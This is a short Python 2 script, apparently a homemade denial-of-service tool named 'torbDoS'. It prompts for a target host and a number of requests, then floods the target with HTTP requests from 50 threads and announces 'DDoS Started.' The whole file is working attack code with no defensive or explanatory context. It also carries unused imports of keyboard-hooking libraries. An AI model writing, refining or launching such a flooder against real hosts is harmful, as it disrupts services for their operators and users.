
import requests
import time
import threading
import pythoncom
import pyHook
import random
import socket
import sys
import os
import string

from threading import Thread
from urllib import urlopen
from atexit import register
from os import _exit
from sys import stdout, argv

def auto_send_request(server, number_of_requests=10):
    global inc
    global isDos
    requestsCheck = (requests - 1)
    for z in range(number_of_requests):
        try:
            if isDos == True:
                urlopen(server)
                print "."
                inc = inc + 1
                if inc % 1000 == 0:
                    print "Requests: %s." % (inc)
            elif isDos == False:
                break
        except IOError:
            print "E" 
        if inc >= requestsCheck:
            print "Finished Stress Procedure"

def flood(url, number_of_requests = 1000, number_of_threads = 50):  
    number_of_requests_per_thread = int(number_of_requests/number_of_threads)
    try:
        for x in range(number_of_threads):
            Thread(target=auto_send_request, args=(url, number_of_requests_per_thread)).start()
    except:
        print("\n[E]\n")
    print "\nDone %i requests on %s" % (number_of_requests, url)

def run(action, num_req):    
    global requests
    global inc
    global isDos
    inc = 0
    isDos = False
    if action != "stop":
        print "DDoS Started."
        isDos = True
        server = action
        requests = int(num_req)
        flood(server, requests)
    elif action == "stop":
        isDos = False
        print 'DDoS Stopped.'

def torbDoS():
    x = raw_input("Enter Host: ")
    y = raw_input("Enter Requests: ")
    run(x,y)

torbDoS()